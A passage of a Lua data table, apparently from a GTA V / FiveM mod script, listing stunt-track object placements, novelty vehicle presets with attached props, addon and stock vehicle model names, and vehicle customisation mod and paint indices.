                    'Airport Track', c._vector3(-1066.77, -3152.48, 14.5), {
                        {
                            3966705493, -1041.89, -3219.51, 10.1797, -2.43331,
                            5.32208, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1037.79, -3221.47, 10.3641, -2.43331,
                            5.32208, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1034.16, -3223.3, 10.5366, -2.43331,
                            5.32208, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1036.76, -3219.45, 10.1526, -2.43331,
                            5.32208, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1033.12, -3221.28, 10.3251, -2.43331,
                            5.32208, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1029.37, -3225.6, 11.1956, -11.6033,
                            5.32207, 62.9335, -1, 10
                        },
                        {
                            3966705493, -1028.33, -3223.58, 10.9842, -11.6033,
                            5.32207, 62.9335, -1, 10
                        },
                        {
                            3966705493, -1024.27, -3225.54, 12.1104, -18.1533,
                            5.32205, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1025.44, -3227.83, 12.3497, -18.1533,
                            5.32205, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1020.36, -3230.06, 15.7972, -40.4234,
                            5.32214, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1019.22, -3227.83, 15.5634, -40.4234,
                            5.32214, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1014.85, -3229.56, 20.4393, -50.9034,
                            5.3221, 62.9337, -1, 10
                        },
                        {
                            3966705493, -1016.07, -3231.95, 20.6898, -50.9034,
                            5.3221, 62.9337, -1, 10
                        },
                        {
                            3966705493, -1012.88, -3232.96, 26.0664, -64.0034,
                            5.32209, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1011.63, -3230.51, 25.8104, -64.0034,
                            5.32209, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1009.27, -3231.06, 32.0819, -73.1735,
                            5.32204, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1010.52, -3233.51, 32.3379, -73.1735,
                            5.32214, 62.9337, -1, 10
                        },
                        {
                            3966705493, -1009.36, -3233.48, 38.2311, -83.6535,
                            5.32208, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1008.09, -3230.98, 37.9695, -83.6535,
                            5.32208, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1007.71, -3230.43, 44.185, -92.8235,
                            6.63212, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1009.05, -3228.93, 49.9682, -119.024,
                            6.63217, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1008.93, -3232.81, 44.4969, -92.8235,
                            6.63212, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1010.27, -3231.31, 50.2801, -119.024,
                            6.63217, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1011.96, -3226.91, 54.0691, -142.604,
                            6.6321, 62.9337, -1, 10
                        },
                        {
                            3966705493, -1013.1, -3229.14, 54.3602, -142.604,
                            6.6321, 62.9337, -1, 10
                        },
                        {
                            3966705493, -1017.49, -3226.51, 57.2125, -159.634,
                            6.63211, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1022.14, -3223.91, 58.9186, -168.804,
                            6.63213, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1035.97, -3216.05, 58.7162, 155.826,
                            1.39214, 60.3137, -1, 10
                        },
                        {
                            3966705493, -1031.37, -3218.71, 60.1775, 176.786,
                            6.63213, 60.3137, -1, 10
                        },
                        {
                            3966705493, -1026.33, -3221.63, 59.8766, -168.804,
                            6.63212, 60.3136, -1, 10
                        },
                        {
                            3966705493, -1020.98, -3221.63, 58.6206, -168.804,
                            6.63213, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1024.97, -3219.25, 59.5578, -168.804,
                            6.63212, 60.3136, -1, 10
                        },
                        {
                            3966705493, -1016.33, -3224.24, 56.9145, -159.634,
                            6.63211, 62.9336, -1, 10
                        },
                        {
                            3966705493, -1029.99, -3216.28, 59.8517, 176.786,
                            6.63213, 60.3137, -1, 10
                        },
                        {
                            3966705493, -1029.99, -3216.28, 59.8517, 176.786,
                            6.63213, 60.3137, -1, 10
                        },
                        {
                            3966705493, -1034.73, -3213.86, 58.655, 155.826,
                            1.39214, 60.3137, -1, 10
                        },
                        {
                            3966705493, -1039.18, -3211.42, 55.2255, 138.796,
                            1.39206, 60.3137, -1, 10
                        },
                        {
                            3966705493, -1039.18, -3211.42, 55.2255, 138.796,
                            1.39206, 60.3137, -1, 10
                        },
                        {
                            3966705493, -1040.42, -3213.61, 55.2867, 138.796,
                            1.39206, 60.3137, -1, 10
                        },
                        {
                            3966705493, -1044.34, -3211.51, 50.6082, 128.316,
                            1.39213, 60.3137, -1, 10
                        },
                        {
                            3966705493, -1043.09, -3209.33, 50.547, 128.316,
                            1.39213, 60.3137, -1, 10
                        },
                        {
                            3966705493, -1046.16, -3207.74, 45.1535, 117.837,
                            1.39215, 60.3137, -1, 10
                        },
                        {
                            3966705493, -1048.17, -3206.74, 39.6252, 104.737,
                            1.39214, 60.3137, -1, 10
                        },
                        {
                            3966705493, -1048.92, -3206.44, 33.1586, 87.6005,
                            0.0914728, 60.6227, -1, 10
                        },
                        {
                            3966705493, -1048.18, -3206.88, 26.5446, 77.3408,
                            0.0913896, 60.6229, -1, 10
                        },
                        {
                            3966705493, -1049.44, -3209.13, 26.5487, 77.3407,
                            0.0913427, 60.6228, -1, 10
                        },
                        {
                            3966705493, -1047.3, -3210.37, 21.3947, 56.6411,
                            0.0914017, 58.823, -1, 10
                        },
                        {
                            3966705493, -1047.3, -3210.37, 21.3947, 56.6411,
                            0.0914017, 58.823, -1, 10
                        },
                        {
                            3966705493, -1045.93, -3208.12, 21.3905, 56.6411,
                            0.0914017, 58.823, -1, 10
                        },
                        {
                            3966705493, -1042.61, -3210.12, 16.8766, 42.1517,
                            0.0913785, 58.8231, -1, 10
                        },
                        {
                            3966705493, -1038.64, -3212.63, 13.6141, 28.2018,
                            0.0914187, 58.8231, -1, 10
                        },
                        {
                            3966705493, -1039.97, -3214.83, 13.6182, 28.2018,
                            0.0914187, 58.8231, -1, 10
                        },
                        {
                            3966705493, -1034.82, -3217.71, 11.1985, 16.4116,
                            0.0913871, 69.303, -1, 10
                        },
                        {
                            3966705493, -1033.53, -3215.55, 11.1081, 16.4117,
                            0.0913619, 66.683, -1, 10
                        },
                        {
                            3966705493, -1043.97, -3212.37, 16.8808, 42.1517,
                            0.0913785, 58.8231, -1, 10
                        },
                        {
                            3966705493, -1050.19, -3208.69, 33.1627, 87.6005,
                            0.0914728, 60.6227, -1, 10
                        },
                        {
                            3966705493, -1049.45, -3208.98, 39.6879, 104.737,
                            1.39214, 60.3137, -1, 10
                        },
                        {
                            3966705493, -1047.44, -3209.98, 45.2161, 117.837,
                            1.39215, 60.3137, -1, 10
                        },
                        {
                            3966705493, -1047.44, -3209.98, 45.2161, 117.837,
                            1.39215, 60.3137, -1, 10
                        }
                    }
                }
            },
            Vehicles = {
                {
                    'Panini', {'blazer4', false},
                    {{'prop_dummy_plane', 0.0, 0.0, 0.3, 0.0, 0.0, 180.0}}
                }, {
                    'Bush Car', {'t20', false}, {
                        {
                            'prop_bush_lrg_01c_cr', 0.0, 1.0, -0.5, 0.0, 0.0,
                            180.0
                        },
                        {
                            'prop_bush_lrg_01c_cr', 0.0, -1.2, -0.5, 0.0, 0.0,
                            180.0
                        }
                    }
                }, {
                    'Flying Submarine', {'blimp', false},
                    {{'xm_prop_x17_sub', 0.0, -13.0, 13.0, 0.0, 0.0, 90.0}}
                }, {
                    'Couch Car', {'adder', true, true},
                    {{'prop_ld_farm_couch02', 0.0, 0, -0.1, 0.0, 0.0, 90.0}}
                }, {
                    'Flying Yatch', {'besra', false, true}, {
                        {1338692320, -1.5, 0.0, 5.0, 0.0, 0.0, 90.0},
                        {2890770506, -3.0, 25.0, 5.0, 90.0, 180.0, 90.0},
                        {2890770506, -3.0, 25.0, 5.0, 90.0, 180.0, 90.0},
                        {2890770506, -3.0, -30.0, 5.0, 90.0, 180.0, 90.0},
                        {2890770506, -3.0, -30.0, 5.0, 90.0, 180.0, 90.0},
                        {2890770506, 3.0, 25.0, 5.0, 90.0, 180.0, 270.0},
                        {2890770506, 3.0, 25.0, 5.0, 90.0, 180.0, 270.0},
                        {2890770506, 3.0, -30.0, 5.0, 90.0, 180.0, 270.0},
                        {2890770506, 3.0, -30.0, 5.0, 90.0, 180.0, 270.0}
                    }
                }, {
                    'Russian Tank', {'dubsta2', true, true}, {
                        {'prop_flag_russia', 0.71, 0.67, 2.82, 0.0, 0.0, 0.0},
                        {'prop_rub_t34', 0.0, 0.22, -0.63, 0.0, 0.0, 0.0}
                    }
                }, {
                    'Bath', {'bifta', true, true},
                    {{0x72f99735, -0.31, -0.18, -0.46, 0.0, 0.0, 180.0}}
                }, {
                    'Flying Cock', {'stunt', true, true}, {
                        {
                            'xm_prop_x17_mine_02a', -1.1, -0.59, -5.39, 0.0,
                            -166.09, 0.0
                        },
                        {
                            'xm_prop_x17_mine_02a', 2.1, -0.59, -5.39, 0.0,
                            166.09, 0.0
                        },
                        {
                            'xs_prop_arena_turret_post_01a', 0.0, -2.59, -1.0,
                            -82.0, 0.0, 0.0
                        },
                        {
                            'xs_prop_arena_pit_fire_02a_sf', 0.0, -2.71, -1.0,
                            98.0, -8.34, -8.34
                        }
                    }
                }, {
                    'Test', {'khanjali', true, true}, {
                        {
                            -1435527158, 16.000002, 16.999992, 0.0, 0.0, 0.0,
                            -43.0
                        },
                        {
                            -1435527158, -16.000002, 16.999992, 0.0, 0.0, 0.0,
                            43.0
                        }, {1030400667, 0.0, -3.0, 7.5, -82.5, 0.0, 0.0},
                        {-1435527158, 15.99, -16.5, 0.0, 0.0, 0.0, -135.5},
                        {1030400667, 0.0, -13.5, -1.0, 11.0, 0.0, 0.0},
                        {1030400667, 0.0, -0.000005, 38.6, 90.0, 0.0, -0.00004},
                        {1030400667, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0}
                    }
                }
            }
        },
        AddonVehicles = {
            known = {
                'gtr', '19dbs', '16challenger', '450crf', '911', 'amggtsprior',
                'lb750sv', 'rculi', 'ren_clio_5', 'caprice13', 'elantra07',
                'familiac', 'lp770', 'brz', 'c4cactus', 'agera', 'can',
                'cbr1000', 'g500', 'h2carb', 'sv', 'gtrc', 'lwgtr', 'ar8lb',
                'g63mg', 'scaldarsi', 'db11', 'divo', 'f82', 'fordh', 'g63',
                'gt63', 'rmodamgc63', 'audipd', 'rmodx6', 'x5m', 'bcps', 'f40',
                'eltransit', 'golfgti', 'q8prior', 'rs666', '190e', 'golfmk7',
                'rmodjeep', 'rmodmustang', 'rmodrs6', 'fenyr', 'pturismo',
                'bugatti', 'r8ppis', 'sc18', 'patty', 'californiat', 'vantage',
                '04acuratsx', '180sx', '18performante', '2012leon', '504',
                '718b', '95stang', 'mclarengt', '720s', 'amggtc', 'arrow',
                'e63amg', 'cayenneturbo', '999', 'aaq4', 'amggt', 'audis32',
                'audis8om', 'ben17', 'bentaygast', 'bgnx', 'c63w205', 'c7',
                'camry55', 'viper', 'typer17', 'xj', 'lp700', 'huracan',
                'teslapd', 'foxct', 'foxsterrato', 'foxsian', 'foxevo',
                'mustang', 'st', 'citroc4', 'countach', 'cyrus', 'czr2',
                'dbs2009', 'dbx', 'demon', 'eclipse', 'evo9', 'fairlane66',
                'fct', 'fd3s', 'fz07', 'gt17', 'gto', 'ibiza', 'm3f80', 'm4f82',
                'm5e60', 'mgt', 'monza', 'foxsupra', 'h3', 'foxleggera',
                'rmodi8mlb', 'corvette', 'slingshot', 'f8rarri', 'forgiato',
                'ts1', 'jeepg', 'grandgt18', '2008f150', 'lccreaper', 'remower',
                'evo10', 'ellcharg', 'g770', 'impalass2', 'fox720s', 'chiron',
                'polp1', 'aventador', 'custom', 'centenario', 'p1', 'passatb3',
                'prius17', 'r8ppi', 'raptor2017', 'rav4', 'rs7', 's500w222',
                'str20', 'supra2', 'taycan', 'trossa', 'w210', 'x6m', 'XADV',
                'z4bmw', 'zl12017', '18Velar', '19gt500', '19ramoffroad',
                '650slw', 'acsr', 'amggtr', 'amggtrr20', 'aperta', 'asrad',
                'avj', 'avz', 'battista', 'bc', 'bdivo', 'bmm', 'boss302',
                'brabus700', 'bug09', 'bugatticentodieci', 'c8c', 'chiron17',
                'db5', 'demonhawk', 'enzo', 'f1', 'f8t', 'fc15', 'fxxk2',
                'g63amg6x6', 'gr1', 'tmsm', 'rmz250', 'bmwi8', 'rrst', 'm6f13',
                'charger', 'exor', 'svj', 'gt2rs', 'ferrari812', 'bentayga17',
                '458spc', '63lb', 'c63scoupe', 'hyabusadrag', 'it18', 'jes',
                'kamswb', 'ktklp7704', 'lamboMurcielago', 'lamtmc', 'm5hamman',
                'mcvors', 'mercxclass', 'bm8c', 'cczl', 'bentaygam',
                'mlmansory', 'ursa', 'gle63c', 'sr650fly', 'bmwm8', '19s650',
                'amggtsmansory', 'qx56', 'svr16', 'a8lw12', 'corvettezr1',
                '720stc', 'tmodel', 'kiagt', 'rs5r', 'r8v10', 'nisaltima',
                'mb400', '2020silv', 'foxrossa', 'foxharley2', 'foxharley1',
                'denalihd', 'fox600lt', 'm6x6', 'foxrover1', 'tonkat', 'kuga',
                'silvias15', 'rx7rb', 'fto', 'mr2sw20', 'eclipsegt06',
                'skylinegtr', '2020ss', 'rmodveneno', 'gurkha', 'mlec',
                'mvisiongt', 'nissantitan17', 'one77', 'p1lm', 'q820', 'raid',
                'rimac', 'rmodlp770', 'rmodmi8lb', 'rxf7', 'senna', 'skyline',
                'sq72016', 'superkart', 'terzo', 'tr22', 'vip8', 'wraith',
                'zondar', 'zx10r', 'rmodx6police', '405c', 'vwpolo', 'vwstance',
                'fuluxt2', 'amarok', 'por4s', '19tundra', 'mbenz18', 'peug108',
                'p308', 'RAPTORF150', 'nissantitan', 'suzukigv', 'nismo20',
                'twingo', 'v250', 'pacev', 'techart17', 'audirs3', 'mb18',
                'xxxxx', 'lp610', 'a45', 'ds3', 'KoenigseggAgeraR', 'impalal',
                'everest', 'nspeedo', 'cesc21', '2015a3', 'aimgainnsx', 'cbrr',
                'nh2r', 'hvrod', 'biz25', 'adCar', 'rmodmartin', 'ast', 'a6',
                'r820', 'r8v10abt', 'rs318', 'rs4avant', 'rs6c8', 'rs7c8wb',
                'b5s4', '2015s3', 'rmodbentleygt', 'contss18', 'rmodbentley1',
                '745le', 'm3e30', 'gmt900escal', 'e30t', 'm2f22', 'm6f30',
                'm3e46', 'razor', 'm4c', 'm4', 'rmodm4gts', 'e34touring', 'e60',
                'm516', 'pd_bmw', 'rmodbmwm8', 'rmodm8gte', 'm40i', 'brabus850',
                'mrap', 'beck', 'foxezri', 'exgtr', 'f824slw', 'trhawk',
                'ramlh20', 'mach1', 'cbr1000rrr', 'exc530', '20x5m', 'thekart',
                'clubgtr', 'p1gtr', 'pista', 'pistas', 'mig', '69charger',
                'cbtwister', 'rmodm4', 'rs62', 'b63s', 'mbra850', '570s2',
                'fulux63', 'rmodchiron300', 'rmodbugatti', 'bvit', 'rmodzl1',
                'hevo', '16cc', 'm6gc', 'jeep2012', 'audquattros', 'silver67',
                'trx', 'fmgt', 'hiluxarctic', 'g63AMG', 'r35', '16ss',
                'velociraptor', '2018zl1', 'boss429', 'ram2500', '206sdc',
                'cherokee1', 'm82020', 'vxr', 'm5f90', '4runner', 'fd',
                'sorento19', 'ss69', 'r50', 'g20c', 'yaris08', 'sp21',
                'rmodbolide', 'fxxk16', 'lwalk458', 'lykan', 'duker', 'golfmk6',
                'mt03', 'traicat', 'audiq8', '718caymans', 'demonhawkk',
                'mlnovitec', 'evoque', 'tuatara', 'vulcanpro19', 'sls',
                'italia458', 'kangoo', 'a80', 'trailcat', 'bros60', '405glxfn',
                'patroly60', 'bnteam', 'g20', 'ct5', '70coronet', 'ldsv',
                'rmodmk7', 'kuda', 'e63s', 'gls20', 'olds442', 'godz',
                'rmodsianr', 'brz13', 'rt70', 'xt700', 'voyager96', 'turbo33',
                'lm002', 'mcjcw20', 'subwrx', 'FD2', 'gtx', 'hummer', 'shafie',
                'delsoleg', 'dm1200', 'fox', 'moss', 'mqgts', 'punto', 'rc',
                'vwsava', 'rmodf40', 'fiestawrc', 'fordhv2', 'kx450f',
                'razerx3', 'rmodgtr50', 'gallalb', 'baja', 'bugaceto', '330p4',
                'nm_911', 'nm_918', 'mi8', 'bj40', 'r8lms', 'paraptor',
                'slaf100', 'supsnake', '18phantom', 'g63samg', 'ms1'
            },
            saved = {}
        },
        vehicleslist = {
            {
                'boats', {
                    'dinghy', 'dinghy2', 'dinghy3', 'dinghy4', 'jetmax',
                    'marquis', 'seashark', 'seashark2', 'seashark3', 'speeder',
                    'speeder2', 'squalo', 'submersible', 'submersible2',
                    'suntrap', 'toro', 'toro2', 'tropic', 'tropic2', 'tug'
                }
            }, {
                'commercials', {
                    'benson', 'biff', 'cerberus', 'cerberus2', 'cerberus3',
                    'hauler', 'hauler2', 'mule', 'mule2', 'mule3', 'mule4',
                    'packer', 'phantom', 'phantom2', 'phantom3', 'pounder',
                    'pounder2', 'stockade', 'stockade3', 'terbyte'
                }
            }, {
                'compacts', {
                    'asbo', 'blista', 'brioso', 'club', 'dilettante',
                    'dilettante2', 'kanjo', 'issi2', 'issi3', 'issi4', 'issi5',
                    'issi6', 'panto', 'prairie', 'rhapsody'
                }
            }, {
                'coupes', {
                    'cogcabrio', 'exemplar', 'f620', 'felon', 'felon2',
                    'jackal', 'oracle', 'oracle2', 'sentinel', 'sentinel2',
                    'windsor', 'windsor2', 'zion', 'zion2'
                }
            }, {
                'cycles',
                {
                    'bmx', 'cruiser', 'fixter', 'scorcher', 'tribike',
                    'tribike2', 'tribike3'
                }
            }, {
                'emergency', {
                    'ambulance', 'fbi', 'fbi2', 'firetruk', 'lguard', 'pbus',
                    'police', 'police2', 'police3', 'police4', 'policeb',
                    'polmav', 'policeold1', 'policeold2', 'policet', 'pranger',
                    'predator', 'riot', 'riot2', 'sheriff', 'sheriff2'
                }
            }, {
                'helicopters', {
                    'akula', 'annihilator', 'buzzard', 'buzzard2', 'cargobob',
                    'cargobob2', 'cargobob3', 'cargobob4', 'frogger',
                    'frogger2', 'havok', 'hunter', 'maverick', 'savage',
                    'seasparrow', 'skylift', 'supervolito', 'supervolito2',
                    'swift', 'swift2', 'valkyrie', 'valkyrie2', 'volatus'
                }
            }, {
                'Industrial', {
                    'bulldozer', 'cutter', 'dump', 'flatbed', 'guardian',
                    'handler', 'mixer', 'mixer2', 'rubble', 'tiptruck',
                    'tiptruck2'
                }
            }, {
                'military', {
                    'apc', 'barracks', 'barracks2', 'barracks3', 'barrage',
                    'chernobog', 'crusader', 'halftrack', 'khanjali',
                    'minitank', 'rhino', 'scarab', 'scarab2', 'scarab3',
                    'thruster', 'trailersmall2'
                }
            }, {
                'motorcycles', {
                    'akuma', 'avarus', 'bagger', 'bati', 'bati2', 'bf400',
                    'carbonrs', 'chimera', 'cliffhanger', 'daemon', 'daemon2',
                    'defiler', 'deathbike', 'deathbike2', 'deathbike3',
                    'diablous', 'diablous2', 'double', 'enduro', 'esskey',
                    'faggio', 'faggio2', 'faggio3', 'fcr', 'fcr2', 'gargoyle',
                    'hakuchou', 'hakuchou2', 'hexer', 'innovation', 'lectro',
                    'manchez', 'nemesis', 'nightblade', 'oppressor',
                    'oppressor2', 'pcj', 'ratbike', 'ruffian', 'rrocket',
                    'sanchez', 'sanchez2', 'sanctus', 'shotaro', 'sovereign',
                    'stryder', 'thrust', 'vader', 'vindicator', 'vortex',
                    'wolfsbane', 'zombiea', 'zombieb'
                }
            }, {
                'muscle', {
                    'blade', 'buccaneer', 'buccaneer2', 'chino', 'chino2',
                    'clique', 'coquette3', 'deviant', 'dominator', 'dominator2',
                    'dominator3', 'dominator4', 'dominator5', 'dominator6',
                    'dukes', 'dukes2', 'dukes3', 'faction', 'faction2',
                    'faction3', 'ellie', 'gauntlet', 'gauntlet2', 'gauntlet3',
                    'gauntlet4', 'gauntlet5', 'hermes', 'hotknife', 'hustler',
                    'impaler', 'impaler2', 'impaler3', 'impaler4', 'imperator',
                    'imperator2', 'imperator3', 'lurcher', 'moonbeam',
                    'moonbeam2', 'nightshade', 'peyote2', 'phoenix', 'picador',
                    'ratloader', 'ratloader2', 'ruiner', 'ruiner2', 'ruiner3',
                    'sabregt', 'sabregt2', 'slamvan', 'slamvan2', 'slamvan3',
                    'slamvan4', 'slamvan5', 'slamvan6', 'stalion', 'stalion2',
                    'tampa', 'tampa3', 'tulip', 'vamos', 'vigero', 'virgo',
                    'virgo2', 'virgo3', 'voodoo', 'voodoo2', 'yosemite',
                    'yosemite2', 'yosemite3'
                }
            }, {
                'offroad', {
                    'bfinjection', 'bifta', 'blazer', 'blazer2', 'blazer3',
                    'blazer4', 'blazer5', 'bodhi2', 'brawler', 'bruiser',
                    'bruiser2', 'bruiser3', 'brutus', 'brutus2', 'brutus3',
                    'caracara', 'caracara2', 'dloader', 'dubsta3', 'dune',
                    'dune2', 'dune3', 'dune4', 'dune5', 'everon', 'freecrawler',
                    'hellion', 'insurgent', 'insurgent2', 'insurgent3',
                    'kalahari', 'kamacho', 'marshall', 'mesa3', 'monster',
                    'monster3', 'monster4', 'monster5', 'menacer', 'outlaw',
                    'nightshark', 'rancherxl', 'rancherxl2', 'rebel', 'rebel2',
                    'rcbandito', 'riata', 'sandking', 'sandking2', 'technical',
                    'technical2', 'technical3', 'trophytruck', 'trophytruck2',
                    'vagrant', 'zhaba'
                }
            }, {
                'planes', {
                    'alphaz1', 'avenger', 'avenger2', 'besra', 'blimp',
                    'blimp2', 'blimp3', 'bombushka', 'cargoplane', 'cuban800',
                    'dodo', 'duster', 'howard', 'hydra', 'jet', 'lazer',
                    'luxor', 'luxor2', 'mammatus', 'microlight', 'miljet',
                    'mogul', 'molotok', 'nimbus', 'nokota', 'pyro', 'rogue',
                    'seabreeze', 'shamal', 'starling', 'strikeforce', 'stunt',
                    'titan', 'tula', 'velum', 'velum2', 'vestra', 'volatol'
                }
            }, {
                'suvs', {
                    'baller', 'baller2', 'baller3', 'baller4', 'baller5',
                    'baller6', 'bjxl', 'cavalcade', 'cavalcade2', 'contender',
                    'dubsta', 'dubsta2', 'fq2', 'granger', 'gresley',
                    'habanero', 'huntley', 'landstalker', 'landstalker2',
                    'mesa', 'mesa2', 'novak', 'patriot', 'patriot2', 'radi',
                    'rebla', 'rocoto', 'seminole', 'seminole2', 'serrano',
                    'toros', 'xls', 'xls2'
                }
            }, {
                'sedans', {
                    'asea', 'asea2', 'asterope', 'cog55', 'cog552',
                    'cognoscenti', 'cognoscenti2', 'emperor', 'emperor2',
                    'emperor3', 'fugitive', 'glendale', 'glendale2', 'ingot',
                    'intruder', 'limo2', 'premier', 'primo', 'primo2', 'regina',
                    'romero', 'stafford', 'stanier', 'stratum', 'stretch',
                    'superd', 'surge', 'tailgater', 'warrener', 'washington'
                }
            }, {
                'service', {
                    'airbus', 'brickade', 'bus', 'coach', 'pbus2', 'rallytruck',
                    'rentalbus', 'taxi', 'tourbus', 'trash', 'trash2',
                    'wastelander'
                }
            }, {
                'sports', {
                    'alpha', 'banshee', 'bestiagts', 'blista2', 'blista3',
                    'buffalo', 'buffalo2', 'buffalo3', 'carbonizzare', 'comet2',
                    'comet3', 'comet4', 'comet5', 'coquette', 'coquette4',
                    'drafter', 'deveste', 'elegy', 'elegy2', 'feltzer2',
                    'flashgt', 'furoregt', 'fusilade', 'futo', 'gb200',
                    'hotring', 'komoda', 'imorgon', 'issi7', 'italigto',
                    'jugular', 'jester', 'jester2', 'jester3', 'khamelion',
                    'kuruma', 'kuruma2', 'locust', 'lynx', 'massacro',
                    'massacro2', 'neo', 'neon', 'ninef', 'ninef2', 'omnis',
                    'paragon', 'paragon2', 'pariah', 'penumbra', 'penumbra2',
                    'raiden', 'rapidgt', 'rapidgt2', 'raptor', 'revolter',
                    'ruston', 'schafter2', 'schafter3', 'schafter4',
                    'schafter5', 'schafter6', 'schlagen', 'schwarzer',
                    'sentinel3', 'seven70', 'specter', 'specter2', 'streiter',
                    'sugoi', 'sultan', 'sultan2', 'surano', 'tampa2', 'tropos',
                    'verlierer2', 'vstr', 'zr380', 'zr3802', 'zr3803'
                }
            }, {
                'sportclassic', {
                    'ardent', 'btype', 'btype2', 'btype3', 'casco', 'cheetah2',
                    'coquette2', 'deluxo', 'dynasty', 'fagaloa', 'feltzer3',
                    'gt500', 'infernus2', 'jb700', 'jb7002', 'mamba', 'manana',
                    'manana2', 'michelli', 'monroe', 'nebula', 'peyote',
                    'peyote3', 'pigalle', 'rapidgt3', 'retinue', 'retinue2',
                    'savestra', 'stinger', 'stingergt', 'stromberg', 'swinger',
                    'torero', 'tornado', 'tornado2', 'tornado3', 'tornado4',
                    'tornado5', 'tornado6', 'turismo2', 'viseris', 'z190',
                    'ztype', 'zion3', 'cheburek'
                }
            }, {
                'super', {
                    'adder', 'autarch', 'banshee2', 'bullet', 'cheetah',
                    'cyclone', 'entity2', 'entityxf', 'emerus', 'fmj', 'furia',
                    'gp1', 'infernus', 'italigtb', 'italigtb2', 'krieger',
                    'le7b', 'nero', 'nero2', 'osiris', 'penetrator',
                    'pfister811', 'prototipo', 'reaper', 's80', 'sc1',
                    'scramjet', 'sheava', 'sultanrs', 't20', 'taipan',
                    'tempesta', 'tezeract', 'thrax', 'tigon', 'turismor',
                    'tyrant', 'tyrus', 'vacca', 'vagner', 'vigilante',
                    'visione', 'voltic', 'voltic2', 'xa21', 'zentorno',
                    'zorrusso'
                }
            }, {
                'trailers', {
                    'armytanker', 'armytrailer', 'armytrailer2', 'baletrailer',
                    'boattrailer', 'cablecar', 'docktrailer', 'freighttrailer',
                    'graintrailer', 'proptrailer', 'raketrailer', 'tr2', 'tr3',
                    'tr4', 'trflat', 'tvtrailer', 'tanker', 'tanker2',
                    'trailerlarge', 'trailerlogs', 'trailersmall', 'trailers',
                    'trailers2', 'trailers3', 'trailers4'
                }
            }, {
                'trains', {
                    'freight', 'freightcar', 'freightcont1', 'freightcont2',
                    'freightgrain', 'metrotrain', 'tankercar'
                }
            }, {
                'utility', {
                    'airtug', 'caddy', 'caddy2', 'caddy3', 'docktug',
                    'forklift', 'mower', 'ripley', 'sadler', 'sadler2', 'scrap',
                    'towtruck', 'towtruck2', 'tractor', 'tractor2', 'tractor3',
                    'utillitruck', 'utillitruck2', 'utillitruck3'
                }
            }, {
                'vans', {
                    'bison', 'bison2', 'bison3', 'bobcatxl', 'boxville',
                    'boxville2', 'boxville3', 'boxville4', 'boxville5',
                    'burrito', 'burrito2', 'burrito3', 'burrito4', 'burrito5',
                    'camper', 'gburrito', 'gburrito2', 'journey', 'minivan',
                    'minivan2', 'paradise', 'pony', 'pony2', 'rumpo', 'rumpo2',
                    'rumpo3', 'speedo', 'speedo2', 'speedo4', 'surfer',
                    'surfer2', 'taco', 'youga', 'youga2', 'youga3'
                }
            }
        },
        LSC = {
            ModList = {
                ['Spoilers'] = 0,
                ['Front Bumper'] = 1,
                ['Right Bumper'] = 2,
                ['Side Skirt'] = 3,
                ['Exhaust'] = 4,
                ['Frame'] = 5,
                ['Grille'] = 6,
                ['Hood'] = 7,
                ['Left Fender'] = 8,
                ['Right Fender'] = 9,
                ['Roof'] = 10,
                ['Xeon HeadLights'] = 22,
                ['Vanity Plates'] = 26,
                ['Trims'] = 27,
                ['Ornaments'] = 28,
                ['Dashboard'] = 29,
                ['Dial'] = 30,
                ['Door Speakers'] = 31,
                ['Seats'] = 32,
                ['Steeringwheel'] = 33,
                ['Shifter Model'] = 34,
                ['Plaques'] = 35,
                ['Speakers'] = 36,
                ['Trunk'] = 37,
                ['Hydraulics'] = 38,
                ['EngineBlock'] = 39,
                ['AirFilter'] = 40,
                ['Struts'] = 41,
                ['ArchCover'] = 42,
                ['Aerials'] = 43,
                ['Trim2'] = 44,
                ['Tank'] = 45,
                ['Windows'] = 46,
                ['Livery'] = 48,
                ['Horns'] = 14,
                ['Wheels'] = 23,
                ['Respray'] = 100,
                ['Lights'] = 101,
                ['Tints'] = 102
            },
            PerformanceModList = {
                ['Armour'] = 16,
                ['Engine'] = 11,
                ['Brakes'] = 12,
                ['Transmission'] = 13,
                ['Suspension'] = 15
            },
            PerformanceLabels = {
                [0] = {'Stock'},
                [1] = {'Stock', 'Max'},
                [2] = {'Stock', 'Level 1', 'Max'},
                [3] = {'Stock', 'Level 1', 'Level 2', 'Max'},
                [4] = {'Stock', 'Level 1', 'Level 2', 'Level 3', 'Max'},
                [5] = {
                    'Stock', 'Level 1', 'Level 2', 'Level 3', 'Level 4', 'Max'
                }
            },
            PaintColors = {
                MetallicIDS = {
                    0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 27, 28, 29, 30, 31,
                    32, 33, 34, 35, 36, 37, 38, 49, 50, 51, 52, 53, 54, 61, 62,
                    63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 88, 89, 90,
                    91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104,
                    105, 106, 107, 111, 112, 125, 137, 141, 142, 143, 145, 150
                },
                MetallicLBLS = {
                    'Metallic Black', 'Metallic Graphite Black',
                    'Metallic Black Steal', 'Metallic Dark Silver',
                    'Metallic Silver', 'Metallic Blue Silver',
                    'Metallic Steel Gray', 'Metallic Shadow Silver',
                    'Metallic Stone Silver', 'Metallic Midnight Silver',
                    'Metallic Gun Metal', 'Metallic Anthracite Grey',
                    'Metallic Red', 'Metallic Torino Red',
                    'Metallic Formula Red', 'Metallic Blaze Red',
                    'Metallic Graceful Red', 'Metallic Garnet Red',
                    'Metallic Desert Red', 'Metallic Cabernet Red',
